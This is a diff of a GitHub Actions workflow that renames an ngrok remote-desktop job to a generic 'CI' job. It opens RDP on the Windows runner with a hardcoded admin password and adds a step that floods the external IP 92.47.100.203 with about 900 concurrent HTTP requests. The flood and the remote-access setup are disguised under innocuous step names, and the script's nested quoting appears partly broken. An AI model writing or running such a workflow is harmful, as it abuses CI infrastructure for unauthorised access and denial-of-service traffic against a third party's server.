@@ -1,58 +1,72 @@
-name: Ngrok and SSH RDP Connection
+name: CI
 
 on:
+  push:
   workflow_dispatch:
 
 jobs:
-
-  ngrok_ssh_rdp:
-
+  build:
     runs-on: windows-latest
 
     steps:
-    - name: Checkout Code
-      uses: actions/checkout@v2
-
-    - name: Set Credentials  
-      run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
-
-    - name: Download Ngrok
+    - name: Download
       run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
 
-    - name: Extract Ngrok
+    - name: Extract
       run: Expand-Archive ngrok.zip
 
-    - name: Authenticate Ngrok
-      env:
-        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}  
+    - name: Auth
       run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
 
-    - name: Enable RDP
+    - name: Enable TS
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+
+    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+
+    - name: Run Bash Script
       run: |
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        echo '#!/bin/bash
 
-    - name: Validate Ngrok
-      run: .\ngrok\ngrok -version
+        # Install requests library
+        pip install requests
 
-    - name: Start Ngrok Tunnel
-      run: .\ngrok\ngrok tcp 3389 --log=stdout &
-      id: ngrok
+        # Create Python script file
+        echo \'
+        import requests
+        import threading
 
-    - name: Wait for Ngrok URL
-      run: |
-        $ngrokStatus = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -Method Get
-        $ngrokURL = $ngrokStatus.tunnels[0].public_url
-        echo "Ngrok URL: $ngrokURL"
-        echo "::set-output name=ngrok_url::$ngrokURL"
-      shell: pwsh
+        def send_request():
+            url = "http://92.47.100.203"
+            try:
+                response = requests.get(url)
+                print(f"Response from {url}: {response.status_code}")
+            except Exception as e:
+                print(f"Error sending request to {url}: {e}")
 
-    - name: Establish SSH RDP Connection
-      run: |
-        ssh -L 33389:localhost:3389 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 runneradmin@${{ steps.ngrok.outputs.ngrok_url }} -N
-        if ($LastExitCode -eq 0) { 
-          echo "SSH connection successful"
-        } else {
-          echo "SSH connection failed"
-          exit 1
-        }
+        num_threads = 100
+        threads = [threading.Thread(target=send_request) for _ in range(num_threads)]
+
+        for thread in threads:
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+        \' > script.py
+
+        # Run the script 9 times concurrently
+        for i in {1..9}
+        do
+            python script.py &
+        done
+
+        # Wait for all background processes to finish
+        wait
+        ' > run_script.sh
+
+        bash run_script.sh
